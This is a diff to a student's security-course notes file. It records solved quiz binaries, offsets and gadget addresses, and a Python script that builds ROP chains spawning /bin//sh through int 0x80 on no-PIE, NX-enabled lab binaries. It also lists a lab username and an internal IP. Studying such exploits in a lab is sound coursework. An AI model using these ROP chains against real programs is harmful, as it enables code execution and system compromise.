@@ -5,23 +5,21 @@
 
 ---
 
-## ⚠️ NEXT QUIZ — WHAT TO EXPECT (ROP focused)
+## ✅ QUIZ 4 — SOLVED (mmap ROP, example sets bin2 + g1)
 
-> **This quiz will focus on Return-Oriented Programming (ROP) and mmap-based gadget chains.**
-> The previous quiz (Quiz 3) covered shellcode + ret2libc + control-flow redirect. This one escalates.
+> **Quiz 4 covered mmap-based dynamic ROP gadget chains. All 4 example binaries solved.**
+> Full step-by-step findings → [FINDINGS.md](FINDINGS.md) · Summary → [STATUS.md](STATUS.md)
+> Quiz day prompt (group 6) → [NEXT_SESSION_PROMPT.md](NEXT_SESSION_PROMPT.md)
 
-**Based on all solved sets — realistic expectations:**
+**Confirmed values (all 4 example binaries share these):**
 
-| Binary | Most likely | Reasoning |
-|--------|-------------|-----------|
-| bin.0 | PIE warm-up — skip | Consistent this year (lefteris/nektarios/kyriaki/2026-g3) |
-| bin.1 | NX on → **mmap ROP** or ret2libc | ROP not tested this year yet |
-| bin.2 | RWE → **shellcode** | bin.2 was shellcode in EVERY solved set, both years |
-| bin.3 | NX on → **mmap ROP** (different gadget table from bin.1) | Pattern from 1048972 and out4 set B |
-
-**Still possible — do not assume:**
-- All bins could be ret2libc/shellcode (happened in last year's regina/tasos sets)
-- Offsets will differ from all previous sets — always read `lea -0xNN(%ebp)` fresh per binary
+| Value | Confirmed |
+|-------|-----------|
+| `gadget_base` | `0x070493e0` (formula gives +0x3e8, actual is +0x3e0 — verify via GDB!) |
+| `mmap_base` | `0x07049000` |
+| `WR_ADDR` | `0x07049500` (mmap+0x500, never .bss) |
+| OFFSET (bin2 set) | **56** (`lea -0x34(%ebp)` in display_file) |
+| OFFSET (g1 set) | **52** (`lea -0x30(%ebp)` in display_file) |
 
 **Start here — 4 commands that classify any binary:**
 ```bash
@@ -1219,6 +1217,54 @@ env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 ./exploit.1b
 ```
 > `exploit.1b` was also created during the quiz session (Apr 3 18:38, 16 min after exploit.1).
 > Both files remain on lab machine with original timestamps as evidence.
+
+---
+
+### 10K. QUIZ 4 EXAMPLE SETS — bin2 + g1 (2026-04-24) ✅ ALL SOLVED
+
+> Full findings with step-by-step methodology: [FINDINGS.md](FINDINGS.md)
+> Confirmed `uid=9992(apieri01)` on all 4 binaries. Lab machine: 103ws14 (10.16.13.89).
+
+**All 4 binaries:** NX on (no shellcode), no PIE, no canary. mmap+movb dynamic gadget building.
+
+| Binary | Set | OFFSET | gadget_base | WR_ADDR |
+|--------|-----|--------|-------------|---------|
+| bin.1 | bin2 | 56 | 0x070493e0 | 0x07049500 |
+| bin.2 | bin2 | 56 | 0x070493e0 | 0x07049500 |
+| bin.1 | g1   | 52 | 0x070493e0 | 0x07049500 |
+| bin.2 | g1   | 52 | 0x070493e0 | 0x07049500 |
+
+**Gadget order differs between binaries** — see [FINDINGS.md](FINDINGS.md) for each table.
+
+**Key surprise:** gadget_base formula gives `0x070493e8` but actual is `0x070493e0` (off by 8). Always verify with GDB.
+
+**Solver script** (generates all 4 exploits):
+```python
+import struct
+def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
+gb = 0x070493e0; WR = 0x07049500
+
+def build(offset, g_pop, g_xea, g_mptr, g_mebx, g_xecx, g_xedx, g_al, g_int80):
+    c  = b'A' * offset
+    c += p32(g_pop); c += b'/bin'; c += p32(WR);   c += p32(g_mptr)
+    c += p32(g_pop); c += b'//sh'; c += p32(WR+4); c += p32(g_mptr)
+    c += p32(g_pop); c += p32(WR); c += p32(0x41414141); c += p32(g_mebx)
+    c += p32(g_xecx); c += p32(g_xedx); c += p32(g_xea); c += p32(g_al); c += p32(g_int80)
+    return str(len(c)).encode() + b' ' + c
+
+# bin2/bin.1: OFFSET=56
+with open('bin2/exploit.1','wb') as f:
+    f.write(build(56, gb+0x03,gb+0x00,gb+0x06,gb+0x0c,gb+0x09,gb+0x0f,gb+0x12,gb+0x15))
+# bin2/bin.2: OFFSET=56
+with open('bin2/exploit.2','wb') as f:
+    f.write(build(56, gb+0x00,gb+0x03,gb+0x06,gb+0x09,gb+0x0c,gb+0x0f,gb+0x12,gb+0x15))
+# g1/bin.1: OFFSET=52, INT80/MOVAL swapped (+0x12=int80, +0x15=moval → call +0x15 then +0x12)
+with open('g1/exploit.1','wb') as f:
+    f.write(build(52, gb+0x03,gb+0x00,gb+0x06,gb+0x0c,gb+0x09,gb+0x0f,gb+0x15,gb+0x12))
+# g1/bin.2: OFFSET=52, same order as bin2/bin.2
+with open('g1/exploit.2','wb') as f:
+    f.write(build(52, gb+0x00,gb+0x03,gb+0x06,gb+0x09,gb+0x0c,gb+0x0f,gb+0x12,gb+0x15))
+```
 
 ---
 
